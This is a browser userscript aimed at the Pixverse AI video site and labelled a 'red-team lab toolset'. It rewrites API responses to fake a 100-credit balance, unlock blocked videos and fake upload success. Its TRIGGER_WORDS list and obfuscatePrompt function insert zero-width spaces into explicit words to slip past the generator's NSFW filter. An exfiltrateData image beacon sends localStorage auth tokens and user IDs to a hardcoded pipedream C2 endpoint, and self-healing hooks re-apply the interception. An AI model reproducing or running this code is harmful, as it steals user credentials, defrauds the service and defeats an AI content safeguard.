// ==UserScript==
// @name        4ndr0tools-PixverseTESTING
// @namespace   https://github.com/4ndr0666/userscripts
// @author      4ndr0666
// @version     2.5.2
// @description Red-team lab toolset for blue team engagements. Control panel for C2 ops, credits patch, video/status unlock, robust download, prompt NSFW bypass, API override, anti-blockers, minimal toast UI. Robust filename & sanitize helpers added. Includes self-healing hooks and covert data exfiltration.
// @icon        https://raw.githubusercontent.com/4ndr0666/4ndr0site/refs/heads/main/static/cyanglassarch.png
// @match       https://app.pixverse.ai/*
// @run-at      document-start
// @grant       GM_setValue
// @grant       GM_getValue
// @license     MIT
// ==/UserScript==

(() => {
  "use strict";

  // Prevent multiple initializations of the script if it somehow gets loaded more than once.
  if (window._pixverseToolkitInitialized) {
    return;
  }
  window._pixverseToolkitInitialized = true;

  //────── CONFIGURATION & STATE ──────//

  const DEBUG_PREFIX = '[Debug]';
  const MAX_ATTEMPTS = 30; // Max attempts for DOM element observation in setupWatermarkButton
  let savedMediaPath = null; // Stores the path of a successfully uploaded media for faking future uploads
  let isInitialized = false; // Flag to ensure core overrides are run only once
  let btnAttached = false; // Flag to track if the custom download button handler has been attached
  let downloadButtonObserver = null; // Reference to the MutationObserver for the download button

  // --- References to your custom overridden functions for self-healing ---
  // These will store the function pointers to your overridden XMLHttpRequest.prototype.open
  // and window.fetch so you can check if they've been replaced by other scripts.
  let myCustomXhrOpen = null;
  let myCustomFetch = null;

  // --- Operational Configuration (Dynamically loaded from GM_setValue) ---
  const config = {
    // Default settings. These will be loaded from storage if available.
    debugMode: false, // Default: False for stealthy red team deployment. True for development.
    c2Enabled: false, // Default: False for production; controls data exfiltration.
    c2Server: "https://eovz1i2e285q5i.m.pipedream.net" // Canonical C2 endpoint for logging/exfil
  };

  // List of words to obfuscate in prompts to bypass NSFW filters
  const TRIGGER_WORDS = [
    "ass","anal","asshole","anus","areola","areolas","blowjob","boobs","bounce","bouncing","breast","breasts",
    "bukake","buttcheeks","butt","cheeks","climax","clit","cleavage","cock","corridas","crotch","cum","cums","culo","cunt",
    "deep","deepthroat","deepthroating","deepthroated","dick","esperma","fat ass","fellatio","fingering","fuck","fucking","fucked","horny","lick","masturbate",
    "masterbating","missionary","member","meco","moan","moaning","nipple","nsfw","oral","orgasm","penis","phallus","pleasure",
    "pussy","rump","semen","seductively","slut","slutty","splooge","squeezing","squeeze","suck","sucking","swallow","throat","throating",
    "tits","tit","titty","titfuck","titties","tittydrop","tittyfuck","titfuck","vagina","wiener","whore","creampie","cumshot","cunnilingus",
    "doggystyle","ejaculate","ejaculation","handjob","jerk off","labia","nude","orgy","porn","prolapse",
    "rectum","rimjob","sesual","stripper","submissive","teabag","threesome","vibrator","voyeur","whore"
  ];

  /**
   * Helper function to escape special characters in a string for use in a RegExp constructor.
   * @param {string} str - The string to escape.
   * @returns {string} - The escaped string.
   */
  function escapeRegExp(str) {
    return str.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  }

  // Pre-compile a single regex for efficient NSFW prompt obfuscation.
  const NSFW_PROMPT_REGEX = new RegExp(`\\b(?:${TRIGGER_WORDS.map(escapeRegExp).join('|')})\\b`, "gi");

  // API endpoints to intercept and modify. Regular expressions are used for flexible matching.
  const API_ENDPOINTS = {
    credits: /\/user\/credits(?:\?|$)/, // Matches /user/credits or /user/credits?param=value
    videoList: /\/video\/list\/personal/,
    batchUpload: /\/media\/batch_upload_media/,
    singleUpload: /\/media\/upload/,
    creativePrompt: /\/creative_platform\/video\// // Endpoint for submitting video generation prompts
  };

  //────── CORE HELPERS ──────//

  /**
   * Checks if a given URL matches a predefined API endpoint using its regex.
   * @param {string} url - The URL to test.
   * @param {string} key - The key of the API endpoint in API_ENDPOINTS.
   * @returns {boolean} - True if the URL matches the endpoint, false otherwise.
   */
  function matchesEndpoint(url, key) {
    return API_ENDPOINTS[key]?.test(url);
  }

  /**
   * Logs messages to the console with a consistent prefix.
   * Only logs if `config.debugMode` is true.
   * @param {...any} args - Arguments to log.
   */
  function log(...args) {
    if (config.debugMode) {
      console.log(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Logs error messages to the console with a consistent prefix.
   * Only logs if `config.debugMode` is true.
   * @param {...any} args - Arguments to log.
   */
  function error(...args) {
    if (config.debugMode) {
      console.error(DEBUG_PREFIX, ...args);
    }
  }

  /**
   * Exfiltrates data covertly using an image beacon.
   * Only attempts if `config.c2Enabled` is true and `config.c2Server` is configured.
   * @param {string} dataType - A label for the type of data (e.g., "session_id", "user_email").
   * @param {string} dataPayload - The actual data to exfiltrate.
   */
  function exfiltrateData(dataType, dataPayload) {
    if (!config.c2Enabled || !config.c2Server) {
      log("C2 exfiltration is disabled or server is not configured. Skipping.");
      return;
    }
    try {
      const beacon = new Image();
      // Construct the URL: your C2 server, a path to identify the data type, and the encoded payload.
      // The timestamp helps prevent caching and adds a bit of uniqueness.
      beacon.src = `${config.c2Server}/exfil?type=${encodeURIComponent(dataType)}&data=${encodeURIComponent(dataPayload)}&_t=${Date.now()}`;
      // No need to append to DOM, just setting src triggers the request.
      log(`Data exfiltration initiated for type: ${dataType}`);
    } catch (e) {
      error(`Failed to exfiltrate data of type ${dataType}:`, e);
    }
  }

  /**
   * Parses a request body (either FormData or a JSON string) into a JavaScript object.
   * @param {FormData|string} body - The request body.
   * @returns {object|null} - The parsed object, or null if parsing fails or body type is unsupported.
   */
  function parseBody(body) {
    if (body instanceof FormData) {
      try {
        return Object.fromEntries(body);
      } catch (e) {
        error("Failed to parse FormData:", e);
        return null;
      }
    }
    if (typeof body === "string") {
      try {
        return JSON.parse(body);
      } catch (e) {
        error("Failed to parse JSON string:", e);
        return null;
      }
    }
    return null; // Return null for unsupported body types
  }

  /**
   * Obfuscates trigger words in a prompt by inserting zero-width spaces (`\u200B`).
   * @param {string} prompt - The original prompt string.
   * @returns {string} - The obfuscated prompt string.
   */
  function obfuscatePrompt(prompt) {
    return prompt.replace(NSFW_PROMPT_REGEX, m => m.split('').join('\u200B'));
  }

  /**
   * Extracts a media path from an API request body, specifically for upload endpoints.
   * @param {object} data - The request data object.
   * @param {string} url - The URL of the request, used to determine the endpoint type.
   * @returns {string|null} - The extracted media path (e.g., "path/to/video.mp4"), or null if not found.
   */
  function extractMediaPath(data, url) {
    if (!data || typeof data !== "object") {
      return null;
    }
    if (matchesEndpoint(url, "batchUpload") && Array.isArray(data.images)) {
      return data.images[0]?.path || null;
    }
    if (matchesEndpoint(url, "singleUpload")) {
      if (typeof data.path === "string") return data.path;
      if (typeof data.media_path === "string") return data.media_path;
      for (const k in data) {
        if (typeof data[k] === "string" && /\.mp4$/i.test(data[k])) {
          return data[k];
        }
      }
    }
    return null;
  }

  //────── API MODIFICATION LOGIC ──────//

  /**
   * Modifies the user credits response to always show 100 credits.
   * @param {object} data - The original response data.
   * @returns {object|null} - The modified data, or null if the structure doesn't match.
   */
  function tryModifyCredits(data) {
    if (data?.Resp?.credits !== undefined) {
      const clone = structuredClone(data); // Create a deep clone to avoid side effects
      clone.Resp.credits = 100;
      log('Credits restored to 100');
      // Exfiltrate a user ID if it's available and C2 is enabled.
      if (config.c2Enabled && data.Resp.user_id) {
          exfiltrateData("user_id_from_credits", data.Resp.user_id.toString());
      }
      return clone;
    }
    return null;
  }

  /**
   * Modifies the video list response to unlock video status (e.g., from blocked to ready)
   * and bypass NSFW placeholder images by pointing directly to the video path.
   * @param {object} data - The original response data.
   * @returns {object} - The modified data. Returns original data if structure is unexpected.
   */
  function modifyVideoList(data) {
    if (!data?.Resp?.data) {
      return data;
    }
    const NSFW_PLACEHOLDERS = [
      "/nsfw", "/forbidden", "placeholder", "blocked", "ban", "pixverse-ban"
    ];

    const isNSFW = (url) => url && NSFW_PLACEHOLDERS.some(p => url.includes(p));

    // FIX: Use a shallow clone as we are replacing the inner array anyway. More performant.
    const clone = { ...data, Resp: { ...data.Resp } };
    clone.Resp.data = clone.Resp.data.map(item => {
      const newItem = { ...item }; // Create a shallow copy of the item to modify
      if (newItem.video_status === 7) {
        newItem.video_status = 1;
      }

      let preview =
        (newItem.extended === 1 && newItem.customer_paths?.customer_video_last_frame_url) ||
        newItem.customer_paths?.customer_img_url ||
        '';

      if (!isNSFW(preview) && preview) {
        newItem.first_frame = preview;
      } else if (newItem.video_path) {
        newItem.first_frame = `https://media.pixverse.ai/${newItem.video_path}#t=0.2`;
      } else {
        newItem.first_frame = preview;
      }
      newItem.url = newItem.video_path ? `https://media.pixverse.ai/${newItem.video_path}` : '';
      return newItem;
    });
    return clone;
  }

  /**
   * Central function to apply appropriate response modifications based on the request URL.
   * @param {object} data - The original response data.
   * @param {string} url - The URL of the request.
   * @returns {object|null} - The modified data, or null if no modification was applied.
   */
  function modifyResponse(data, url) {
    if (!data || typeof data !== "object") return null;

    if (matchesEndpoint(url, "credits")) {
      const modified = tryModifyCredits(data);
      if (modified) return modified;
    }

    if (matchesEndpoint(url, "videoList")) {
      return modifyVideoList(data);
    }

    // Upload modification: apply a generic success fake if any error occurs AND we have a saved path.
    if (matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) {
      if (data?.ErrCode !== 0 && savedMediaPath) {
        log(`Attempting to fake upload success for ${url}. Original ErrCode: ${data.ErrCode}. Saved Path: ${savedMediaPath}`);
        const name = savedMediaPath.split('/').pop() || 'uploaded_media';
        if (matchesEndpoint(url, "batchUpload")) {
          return {
            ErrCode: 0,
            ErrMsg: "success",
            Resp: {
              result: [{
                id: Date.now(), category: 0, err_msg: "",
                name, path: savedMediaPath, size: 0,
                url: `https://media.pixverse.ai/${savedMediaPath}`
              }]
            }
          };
        } else { // singleUpload
          return {
            ErrCode: 0, ErrMsg: "success", Resp: {
              path: savedMediaPath,
              url: `https://media.pixverse.ai/${savedMediaPath}`,
              name, type: 1
            }
          };
        }
      } else if (config.debugMode && data?.ErrCode !== undefined && data.ErrCode !== 0) {
        log(`Upload error for ${url}, but faking not applied. ErrCode: ${data.ErrCode}, savedMediaPath: ${savedMediaPath}`);
      }
    }
    return null;
  }

  //────── FILENAME & SANITIZE HELPERS ──────//

  /**
   * Sanitizes a string for use as a filename.
   * @param {string} str - The input string.
   * @returns {string} - The sanitized filename string.
   */
  function sanitize(str) {
    return String(str)
      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_")
      .replace(/^\.+|\.+$/g, '')
      .replace(/^\s+|\s+$/g, '')
      .slice(0, 120);
  }

  /**
   * Generates a suitable filename for a video element.
   * @param {HTMLVideoElement} videoEl - The video element from which to derive the filename.
   * @param {string} fallback - A default filename to use if no better name can be determined.
   * @returns {string} - The generated and sanitized filename.
   */
  function getFilename(videoEl, fallback = "video.mp4") {
    let src = (videoEl?.currentSrc || videoEl?.src || fallback);
    let guess = (src.split("/").pop() || fallback).split("?")[0];
    let title = "";
    try {
      let container = videoEl.closest(".component-video,.pv-video-detail-page");
      title = container?.querySelector("h2, .title, .pv-title")?.textContent?.trim() || "";
    } catch (e) {
      error("Error extracting title for filename:", e);
    }
    return title ? sanitize(title) + ".mp4" : sanitize(guess);
  }

  //────── NETWORK INTERCEPTION ──────//

  /**
   * Overrides the native XMLHttpRequest.prototype.open and .send methods
   * to intercept and modify request bodies and responses.
   */
  function overrideXHR() {
    const oOpen = XMLHttpRequest.prototype.open;
    const oSend = XMLHttpRequest.prototype.send;

    XMLHttpRequest.prototype.open = function(m, u) {
      this._url = u;
      this._method = m;
      return oOpen.apply(this, arguments);
    };
    myCustomXhrOpen = XMLHttpRequest.prototype.open;

    XMLHttpRequest.prototype.send = function(body) {
      const url = this._url || "";
      const method = (this._method || "GET").toUpperCase();

      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          let obj = (typeof body === "string") ? JSON.parse(body) : body;
          if (obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            body = JSON.stringify(obj);
          }
        } catch (e) {
          error("Error obfuscating XHR prompt:", e);
        }
      }

      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) savedMediaPath = p;
      }

      this.addEventListener("load", () => {
        if (this.status >= 200 && this.status < 300) {
          let resp;
          try {
            resp = this.responseType === "json" ? this.response : JSON.parse(this.responseText || "{}");
          } catch (e) {
            error("Error parsing XHR response:", e);
            resp = null;
          }

          if (resp !== null) {
            const modifiedResponse = modifyResponse(resp, url);
            if (modifiedResponse) {
              Object.defineProperties(this, {
                response: { value: modifiedResponse, writable: false, configurable: true },
                responseText: { value: JSON.stringify(modifiedResponse), writable: false, configurable: true }
              });
              log('XHR response modified for:', url);
            }
          }
        }
      }, { once: true });

      return oSend.apply(this, arguments);
    };
    log('XHR override initialized');
  }

  /**
   * Overrides the native window.fetch method to intercept and modify requests and responses.
   */
  function overrideFetch() {
    const origFetch = window.fetch;

    window.fetch = async function(...args) {
      const url = typeof args[0] === "string" ? args[0] : args[0]?.url || "";
      let init = args[1];
      const method = (init?.method || "GET").toUpperCase();
      let body = init?.body;

      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
        try {
          let obj = (typeof body === "string") ? JSON.parse(body) : body;
          if (obj.prompt) {
            obj.prompt = obfuscatePrompt(obj.prompt);
            init = { ...init, body: JSON.stringify(obj) };
            args[1] = init;
            body = init.body;
          }
        } catch (e) {
          error("Error obfuscating Fetch prompt:", e);
        }
      }

      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
        const data = parseBody(body);
        const p = extractMediaPath(data, url);
        if (p) savedMediaPath = p;
      }

      try {
        const res = await origFetch.apply(this, args);
        const contentType = res.headers.get("content-type") || "";

        if (contentType.includes("application/json")) {
          const clone = res.clone();
          let json;
          try { json = await clone.json(); } catch (e) {
            error("Error parsing Fetch response JSON:", e);
            json = null;
          }

          if (json !== null) {
            const modifiedResponse = modifyResponse(json, url);
            if (modifiedResponse) {
              const modifiedBodyString = JSON.stringify(modifiedResponse);
              const headers = new Headers(res.headers);
              headers.set("Content-Type", "application/json");

              log('Fetch response modified for:', url);
              return new Response(modifiedBodyString, {
                status: res.status,
                statusText: res.statusText,
                headers: headers
              });
            }
          }
        }
        return res;
      } catch (err) {
        error("Fetch error for", url, err);
        throw err;
      }
    };
    myCustomFetch = window.fetch;
    log('Fetch override initialized');
  }

  //────── DOM & UI MANIPULATION ──────//

  /**
   * Simple throttle function to limit how often a function can be called.
   * @param {Function} fn - The function to throttle.
   * @param {number} baseDelay - The minimum base delay in milliseconds between function invocations.
   * @param {number} [jitter=100] - Max random milliseconds to add to the baseDelay.
   * @returns {Function} - The throttled function.
   */
  function throttle(fn, baseDelay, jitter = 100) {
    let last = 0, timeoutId;
    return function(...args) {
      const now = Date.now();
      const currentDelay = baseDelay + Math.random() * jitter;
      if (now - last < currentDelay) {
        clearTimeout(timeoutId);
        timeoutId = setTimeout(() => {
          last = Date.now();
          fn.apply(this, args);
        }, currentDelay - (now - last));
      } else {
        last = now;
        fn.apply(this, args);
      }
    };
  }

  /**
   * Sets up a robust download handler for the existing "Download" button on the page.
   */
  function setupWatermarkButton() {
    if (btnAttached) {
      if (downloadButtonObserver) {
        downloadButtonObserver.disconnect();
        log('MutationObserver for download button disconnected.');
      }
      return;
    }

    let attemptCount = 0;
    // FIX: Cache the main content element to avoid repeated DOM queries.
    const mainContent = document.querySelector('#main-content,[role="main"]') || document.body;

    const tryAttachButton = () => {
      if (btnAttached) return;

      let allBtns = mainContent.querySelectorAll("button");

      for (let btn of allBtns) {
        let labelDiv = Array.from(btn.querySelectorAll("div")).find(d => d.textContent?.trim() === "Download");
        if (labelDiv && !btn.dataset.injected) {
          btn.addEventListener("click", e => {
            e.stopPropagation();
            const videoEl = document.querySelector(".component-video>video,video");
            if (videoEl?.src) {
              const url = videoEl.currentSrc || videoEl.src;
              const filename = getFilename(videoEl);
              const a = document.createElement("a");
              a.href = url;
              a.download = filename;
              document.body.appendChild(a);
              a.click();
              a.remove();
              showToast("Download started!");
            } else {
              showToast("No video found to download.");
            }
          }, true);
          btn.dataset.injected = "1";
          btnAttached = true;
          log('Canonical Download button injected');
          if (downloadButtonObserver) {
            downloadButtonObserver.disconnect();
            log('MutationObserver for download button disconnected.');
          }
          return; // Exit after attaching
        }
      }

      if (!btnAttached && attemptCount < MAX_ATTEMPTS) {
        attemptCount++;
        setTimeout(throttledTryAttach, 350 + Math.random() * 50);
      }
    };

    const throttledTryAttach = throttle(tryAttachButton, 300, 100);

    if (!downloadButtonObserver) {
      downloadButtonObserver = new MutationObserver(throttledTryAttach);
      downloadButtonObserver.observe(mainContent, { childList: true, subtree: true });
      log('MutationObserver for download button initialized.');
    }

    tryAttachButton();
  }

  /**
   * Displays a transient toast notification at the bottom center of the screen.
   * Only displays if `config.debugMode` is true.
   * @param {string} msg - The message to display in the toast.
   * @param {number} [duration=3500] - Duration in milliseconds before the toast starts to fade out.
   */
  function showToast(msg, duration = 3500) {
    if (!config.debugMode) return;

    document.querySelectorAll(".pv-toast").forEach(e => e.remove());

    const el = document.createElement("div");
    el.className = "pv-toast";
    el.textContent = msg;

    document.body.appendChild(el);

    requestAnimationFrame(() => el.classList.add("pv-toast-visible"));

    setTimeout(() => {
      el.classList.remove("pv-toast-visible");
      el.addEventListener("transitionend", () => el.remove(), { once: true });
    }, duration);
  }

  /**
   * Overrides context menu blocking mechanisms on the page.
   */
  function overrideContextMenuBlockers() {
    const originalAddEventListener = EventTarget.prototype.addEventListener;
    EventTarget.prototype.addEventListener = function(type, handler, options) {
      if (type === "contextmenu") {
        return; // Block the addition of contextmenu event listeners.
      }
      return originalAddEventListener.apply(this, arguments);
    };

    new MutationObserver(mutations => {
      mutations.forEach(mutation => mutation.addedNodes.forEach(node => {
        if (node.nodeType === 1) {
          if (node.hasAttribute("oncontextmenu")) {
            node.removeAttribute("oncontextmenu");
          }
          node.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
        }
      }));
    }).observe(document.documentElement, { childList: true, subtree: true });

    document.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
    log('Anti-contextmenu enabled');
  }

  //────── SELF-HEALING & INITIALIZATION ──────//

  /**
   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
   */
  function setupSelfHealingHooks() {
    setInterval(() => {
      if (myCustomXhrOpen && XMLHttpRequest.prototype.open !== myCustomXhrOpen) {
        log('XHR hook detected as overwritten, re-applying...');
        overrideXHR();
      }
      if (myCustomFetch && window.fetch !== myCustomFetch) {
        log('Fetch hook detected as overwritten, re-applying...');
        overrideFetch();
      }
    }, 5000 + Math.random() * 1000); // Check every 5-6 seconds
    log('Self-healing hooks initialized');
  }

  //────── CONTROL PANEL ──────//

  /**
   * Loads configuration from `GM_setValue` (GM_config).
   */
  async function loadConfig() {
    // GM_getValue is asynchronous
    config.debugMode = await GM_getValue('debugMode', false);
    config.c2Enabled = await GM_getValue('c2Enabled', false);
    config.c2Server = await GM_getValue('c2Server', "https://eovz1i2e285q5i.m.pipedream.net");
  }

  /**
   * Creates and injects the control panel UI into the DOM.
   */
  async function createControlPanel() { // Made async to await GM_getValue for position
    const panel = document.createElement('div');
    panel.id = 'pv-control-panel';
    panel.innerHTML = `
      <div class="pv-panel-header">
        <span>Pixverse++ v2.4.0</span>
        <button id="pv-panel-toggle" title="Toggle Panel">-</button>
      </div>
      <div class="pv-panel-content">
        <div class="pv-panel-row">
          <label for="pv-debug-mode" title="Show console logs and toast notifications.">Debug Mode</label>
          <input type="checkbox" id="pv-debug-mode">
        </div>
        <div class="pv-panel-row">
          <label for="pv-c2-enabled" title="Enable covert data exfiltration to the C2 server.">C2 Exfil</label>
          <input type="checkbox" id="pv-c2-enabled">
        </div>
        <div class="pv-panel-row pv-c2-server-row">
          <label for="pv-c2-server" title="The Command & Control server endpoint.">C2 Server</label>
          <input type="text" id="pv-c2-server" spellcheck="false">
        </div>
      </div>
    `;

    // FIX: Ensure document.body exists before appending.
    if (!document.body) {
      log('Document body not available for control panel. Retrying...');
      // A small delay and re-attempt might be needed if called too early.
      // For @run-at document-start, DCL is generally preferred for UI elements.
      return;
    }
    document.body.appendChild(panel);

    const debugCheck = document.getElementById('pv-debug-mode');
    const c2Check = document.getElementById('pv-c2-enabled');
    const c2ServerInput = document.getElementById('pv-c2-server');
    const c2ServerRow = panel.querySelector('.pv-c2-server-row');
    const content = panel.querySelector('.pv-panel-content');
    const toggleBtn = document.getElementById('pv-panel-toggle');
    // FIX: Declare header variable for drag functionality
    const header = panel.querySelector('.pv-panel-header');

    // Set initial state from config
    debugCheck.checked = config.debugMode;
    c2Check.checked = config.c2Enabled;
    c2ServerInput.value = config.c2Server;
    c2ServerRow.style.display = config.c2Enabled ? 'flex' : 'none';

    // Add event listeners
    debugCheck.addEventListener('change', () => {
      config.debugMode = debugCheck.checked;
      GM_setValue('debugMode', config.debugMode);
      showToast(`Debug Mode ${config.debugMode ? 'Enabled' : 'Disabled'}`);
    });

    c2Check.addEventListener('change', () => {
      config.c2Enabled = c2Check.checked;
      GM_setValue('c2Enabled', config.c2Enabled);
      c2ServerRow.style.display = config.c2Enabled ? 'flex' : 'none';
      showToast(`C2 Exfiltration ${config.c2Enabled ? 'Enabled' : 'Disabled'}`);
      // Re-evaluate immediate exfiltration opportunities if C2 is enabled (e.g., from local storage)
      if (config.c2Enabled) {
          try {
              const userId = localStorage.getItem('pixverse_user_id');
              if (userId) exfiltrateData("local_storage_user_id", userId);
              const token = localStorage.getItem('pixverse_auth_token');
              if (token) exfiltrateData("local_storage_auth_token", token);
          } catch (e) {
              error("Error accessing local storage after C2 toggle:", e);
          }
      }
    });

    c2ServerInput.addEventListener('input', () => {
      config.c2Server = c2ServerInput.value.trim();
      GM_setValue('c2Server', config.c2Server);
    });

    toggleBtn.addEventListener('click', () => {
      const isHidden = content.style.display === 'none';
      content.style.display = isHidden ? 'block' : 'none';
      toggleBtn.textContent = isHidden ? '-' : '+';
    });

    // Add drag functionality to the control panel
    let isDragging = false;
    let offsetX, offsetY;

    // FIX: Await GM_getValue for panel position
    const storedPosX = await GM_getValue('panelPosX', 'auto');
    const storedPosY = await GM_getValue('panelPosY', '10px');

    panel.style.left = storedPosX;
    panel.style.top = storedPosY;
    // Set right only if left is 'auto' (default or not set)
    panel.style.right = storedPosX === 'auto' ? '10px' : 'auto';

    header.addEventListener('mousedown', (e) => {
      isDragging = true;
      offsetX = e.clientX - panel.getBoundingClientRect().left;
      offsetY = e.clientY - panel.getBoundingClientRect().top;
      panel.style.cursor = 'grabbing';
      panel.style.right = 'auto'; // Disable right/bottom positioning when dragging
    });

    document.addEventListener('mousemove', (e) => {
      if (!isDragging) return;
      panel.style.left = `${e.clientX - offsetX}px`;
      panel.style.top = `${e.clientY - offsetY}px`;
    });

    document.addEventListener('mouseup', () => {
      isDragging = false;
      panel.style.cursor = 'grab';
      // Save position to GM storage
      GM_setValue('panelPosX', panel.style.left);
      GM_setValue('panelPosY', panel.style.top);
    });
  }

  /**
   * Injects CSS styles for the toast notification and the control panel.
   */
  function injectStyles() {
    if (document.getElementById("pv-toolkit-styles")) return;
    const style = document.createElement("style");
    style.id = "pv-toolkit-styles";
    style.textContent = `
      /* --- Toast Styles --- */
      .pv-toast {
        position: fixed; bottom: 22px; left: 50%; transform: translateX(-50%);
        background: rgba(20,40,48,0.94); color: #15FFFF; padding: 8px 20px;
        border-radius: 6px; font: 15px/1.2 sans-serif; z-index: 299999;
        opacity: 0; transition: opacity .25s ease-in-out; pointer-events: none;
        box-sizing: border-box; user-select: none;
      }
      .pv-toast-visible { opacity: 1; }

      /* --- Control Panel Styles --- */
      #pv-control-panel {
        position: fixed; top: 10px; right: 10px; z-index: 300000;
        background: #1a1a1a; color: #e0e0e0; border: 1px solid #444;
        border-radius: 6px; font-family: sans-serif; font-size: 13px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.5); user-select: none;
        min-width: 280px; /* Ensure enough space for inputs */
        cursor: grab;
      }
      .pv-panel-header {
        display: flex; justify-content: space-between; align-items: center;
        padding: 6px 10px; background: #2a2a2a; border-bottom: 1px solid #444;
        cursor: inherit; /* Inherit grab cursor from parent */
      }
      .pv-panel-header span { font-weight: bold; color: #15FFFF; }
      #pv-panel-toggle {
        background: #444; color: #e0e0e0; border: none; border-radius: 4px;
        width: 20px; height: 20px; line-height: 20px; text-align: center;
        cursor: pointer; font-weight: bold;
      }
      .pv-panel-content { padding: 10px; }
      .pv-panel-row {
        display: flex; align-items: center; justify-content: space-between; margin-bottom: 8px;
      }
      .pv-panel-row:last-child { margin-bottom: 0; }
      .pv-panel-row label { margin-right: 15px; cursor: help; }
      #pv-c2-server {
        background: #111; color: #e0e0e0; border: 1px solid #555;
        border-radius: 4px; padding: 4px 6px; width: 170px; font-size: 12px;
        flex-grow: 1; /* Allow input to fill available space */
      }
    `;
    document.head.appendChild(style);
  }

  //────── INITIALIZATION & LIFECYCLE ──────//

  /**
   * Initializes the toolkit by applying all necessary overrides and setting up features.
   * Ensures that initialization happens only once.
   */
  async function initialize() {
    if (isInitialized) {
      return; // Prevent re-initialization.
    }
    try {
      await loadConfig(); // Load configuration from GM_setValue first

      injectStyles(); // Inject CSS for toast and control panel BEFORE creating elements
      await createControlPanel(); // Create and render the control panel, now awaiting its completion

      overrideContextMenuBlockers();
      overrideXHR();
      overrideFetch();
      setupWatermarkButton();
      setupSelfHealingHooks();

      // Example: Read from local storage and exfiltrate data on initialization (if C2 is enabled)
      try {
        if (config.c2Enabled) { // Only attempt if C2 is enabled by the control panel
          const userId = localStorage.getItem('pixverse_user_id'); // Placeholder key, adapt as needed
          if (userId) {
            log('Found potential user ID in local storage:', userId);
            exfiltrateData("local_storage_user_id", userId);
          }
          const token = localStorage.getItem('pixverse_auth_token'); // Placeholder key, adapt as needed
          if (token) {
            log('Found potential auth token in local storage:', token);
            exfiltrateData("local_storage_auth_token", token);
          }
        }
      } catch (e) {
        error("Error accessing local storage during initialization for exfil:", e);
      }

      isInitialized = true;
      log('Pixverse++ initialized'); // Will only log if Debug Mode is enabled
      showToast('Pixverse++ Toolkit loaded ✓'); // Will only show if Debug Mode is enabled
    } catch (e) {
      error('Initialization failed', e); // Will only log if Debug Mode is enabled
      showToast('Pixverse++ init error'); // Will only show if Debug Mode is enabled
    }
  }

  // Determine when to initialize the script.
  // @run-at document-start ensures the script runs as early as possible.
  // If the document is still loading, wait for DOMContentLoaded to ensure basic DOM is ready.
  // Otherwise, if the document is already interactive/complete, initialize immediately.
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initialize, { once: true });
  } else {
    initialize();
  }

})();
